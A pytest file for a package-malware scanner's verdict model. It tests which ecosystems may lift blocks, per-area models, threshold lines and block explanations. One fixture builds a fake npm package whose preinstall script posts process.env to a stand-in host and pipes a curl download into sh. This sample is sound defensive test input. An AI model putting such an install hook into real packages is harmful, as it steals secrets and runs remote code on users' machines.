"""S6, the package verdict: where the trained model may lower a rule's block (lead's decision,
2026-11-10, under the owner's strict rule; PyPI added 2026-11-13 with its own model).

```
  area mcp, skill, package, ... ──► add-only: the model may add a block, never lift one
  area npm (the measured, shipped lift) ──► may lift where the model lists it
  area pypi (its own model, verdict-pypi.json.gz) ──► may lift where that model lists it
  Verdict.LIFT_AREAS_ALLOWED = {npm, pypi}: a new lift area is a deliberate, reviewed change
```
"""

from __future__ import annotations

import gzip
import io
import json
import tarfile
from pathlib import Path
from typing import Any, ClassVar

import pytest

from cordon_scanner import Scanner
from cordon_scanner.decide.verdict import MODEL_PATH, Verdict, VerdictModel
from cordon_scanner.foundation.config.settings import Config


class TestTheLiftAreas:
    def test_only_npm_and_pypi_may_lift(self) -> None:
        assert frozenset({"npm", "pypi"}) == Verdict.LIFT_AREAS_ALLOWED

    @pytest.mark.parametrize("area", ["mcp", "skill", "package", "actions"])
    def test_every_other_area_is_add_only_whatever_the_model_lists(self, area: str) -> None:
        model = {"lift_areas": ["npm", "mcp", "skill", "package", "pypi", "actions"]}
        assert not Verdict.liftable(model, area)

    @pytest.mark.parametrize("area", ["npm", "pypi"])
    def test_a_lift_area_lifts_only_where_the_model_lists_it(self, area: str) -> None:
        assert Verdict.liftable({"lift_areas": [area, "mcp"]}, area)
        assert not Verdict.liftable({"lift_areas": ["mcp"]}, area)

    def test_the_shipped_model_lifts_in_npm_at_most(self) -> None:
        model = VerdictModel.load()
        if model is None:
            pytest.skip("no shipped model in this tree")
        areas = set(model.get("lift_areas") or ()) | set(model.get("areas", {}))
        assert {a for a in areas if Verdict.liftable(model, a)} <= {"npm"}


class TestTheModelEachAreaAnswersTo:
    """A PyPI package answers to the PyPI model where it ships; every other area keeps the shared
    model it had, so npm's released verdict is untouched by the PyPI model."""

    @staticmethod
    def own(tmp_path, monkeypatch, body: dict) -> None:
        path = tmp_path / "verdict-pypi.json.gz"
        with gzip.open(path, "wt", encoding="utf-8") as handle:
            json.dump(body, handle)
        VerdictModel.load.cache_clear()
        monkeypatch.setitem(Verdict.OWN_MODELS, "pypi", path)

    def test_pypi_answers_to_its_own_model(self, tmp_path, monkeypatch) -> None:
        self.own(tmp_path, monkeypatch, {"format": 2, "areas": {"pypi": 0.5}, "tag": "pypi-own"})
        assert (Verdict.model_for("pypi") or {}).get("tag") == "pypi-own"
        VerdictModel.load.cache_clear()

    @pytest.mark.parametrize("area", ["npm", "mcp", "skill", "package"])
    def test_every_other_area_keeps_the_shared_model(self, tmp_path, monkeypatch, area) -> None:
        self.own(tmp_path, monkeypatch, {"format": 2, "areas": {"pypi": 0.5}, "tag": "pypi-own"})
        assert Verdict.model_for(area) == VerdictModel.load(MODEL_PATH)
        VerdictModel.load.cache_clear()

    def test_without_its_own_model_pypi_keeps_the_shared_one(self, tmp_path, monkeypatch) -> None:
        monkeypatch.setitem(Verdict.OWN_MODELS, "pypi", tmp_path / "absent.json.gz")
        VerdictModel.load.cache_clear()
        assert Verdict.model_for("pypi") == VerdictModel.load(MODEL_PATH)
        VerdictModel.load.cache_clear()


class TestTheShippedPyPiModel:
    def test_it_loads_at_this_tree_and_judges_pypi_only(self) -> None:
        from cordon_scanner.decide.verdict import PYPI_MODEL_PATH

        assert PYPI_MODEL_PATH.is_file(), "train it (bench/model/verdict_train.py --scope pypi)"
        VerdictModel.load.cache_clear()
        model = VerdictModel.load(PYPI_MODEL_PATH)
        assert model is not None, "fitted at another fold than this tree's FeatureFold"
        assert model.get("scope") == ["pypi"]
        assert isinstance(model["floor"], list), "the floor is the list of rules never re-graded"
        assert {a for a in model["areas"] if Verdict.liftable(model, a)} <= {"pypi"}


class TestTheMcpLine:
    """MCP servers answer to the line the MCP area was fitted at (reviews/mcp-98/20): the 0.9 scale
    that held them to nine tenths of the shared model's line is gone, so nothing sits on top of the
    fitted line. An area with no line of its own answers to the fallback, as before."""

    def test_no_area_is_scaled(self) -> None:
        assert Verdict.LINE_SCALE == {}

    def test_mcp_blocks_at_its_own_line(self) -> None:
        assert Verdict.line({"mcp": 0.25, "package": 0.5}, "mcp") == pytest.approx(0.25)

    @pytest.mark.parametrize("area", ["npm", "pypi", "skill", "package", "actions"])
    def test_every_other_area_keeps_its_line(self, area: str) -> None:
        areas = {"npm": 0.8, "pypi": 0.7, "skill": 0.6, "package": 0.5, "actions": 0.4, "mcp": 1.0}
        assert Verdict.line(areas, area) == areas[area]

    def test_an_area_with_no_line_answers_to_the_fallback_unscaled(self) -> None:
        assert Verdict.line({"package": 0.5}, "ruby") == 0.5

    def test_mcp_with_no_line_of_its_own_answers_to_the_fallback_unscaled(self) -> None:
        assert Verdict.line({"package": 0.5}, "mcp") == pytest.approx(0.5)

    def test_the_shipped_models_mcp_line_is_its_own(self) -> None:
        model = VerdictModel.load()
        assert model is not None
        assert Verdict.line(model["areas"], "mcp") == model["areas"]["mcp"]


class TestABlockNamesWhatDroveIt:
    """A block by the model lists the facts that drove it, strongest first, each with the places in the package that hold it: path and line, checkable against the files."""

    FILES: ClassVar[dict[str, str]] = {
        "package/package.json": '{"name": "dropper", "version": "1.0.0", "scripts": {"preinstall": "node index.js"}}',
        "package/index.js": (
            "const cp = require('child_process');\n"
            "const body = JSON.stringify(process.env);\n"
            "fetch('https://h.invalid/u', { method: 'POST', body });\n"
            "cp.exec('curl -s https://h.invalid/x | sh');\n"
        ),
    }

    @classmethod
    def scan(cls, tmp_path: Path, files: dict[str, str] | None = None) -> Any:
        archive = tmp_path / "dropper-1.0.0.tgz"
        with tarfile.open(archive, "w:gz") as handle:
            for name, text in (cls.FILES if files is None else files).items():
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                handle.addfile(info, io.BytesIO(data))
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)

    def test_the_drivers_are_ordered_and_each_has_a_place_that_exists(self, tmp_path: Path) -> None:
        result = self.scan(tmp_path)
        verdict = result.verdict
        assert verdict is not None and verdict["score"] >= verdict["block"]
        drivers = verdict["drivers"]["facts"]
        assert drivers and [d["contribution"] for d in drivers] == sorted(
            (d["contribution"] for d in drivers), reverse=True
        )
        for driver in drivers:
            assert driver["locations"] and driver["contribution"] > 0
            for place in driver["locations"]:
                path, _, line = place.rpartition(":")
                path = path.rpartition("!")[2]
                text = self.FILES.get(f"package/{path}") or self.FILES.get(path)
                assert text is not None and 1 <= int(line) <= text.count("\n") + 1, place

    def test_each_listed_fact_is_one_the_model_reads_and_the_scan_made(
        self, tmp_path: Path
    ) -> None:
        result = self.scan(tmp_path)
        model = Verdict.model_for(result.verdict["area"])
        names = {d["fact"] for d in result.verdict["drivers"]["facts"]}
        assert (
            names
            and names <= set(model["features"])
            and names <= set(result.verdict["features"]["values"])
        )

    def test_a_fact_the_scan_cannot_place_is_named_apart_and_never_listed(
        self, tmp_path: Path
    ) -> None:
        drivers = self.scan(tmp_path).verdict["drivers"]
        listed = {d["fact"] for d in drivers["facts"]}
        assert not listed & set(drivers["unlocated"]) and all(
            n.startswith("pkg:") for n in drivers["unlocated"]
        )

    def test_a_package_the_model_does_not_block_carries_no_drivers(self, tmp_path: Path) -> None:
        clean = {
            "package/package.json": '{"name": "tiny", "version": "1.0.0", "main": "index.js"}',
            "package/index.js": "module.exports = (a, b) => a + b;\n",
        }
        verdict = self.scan(tmp_path, clean).verdict
        assert verdict is None or "drivers" not in verdict
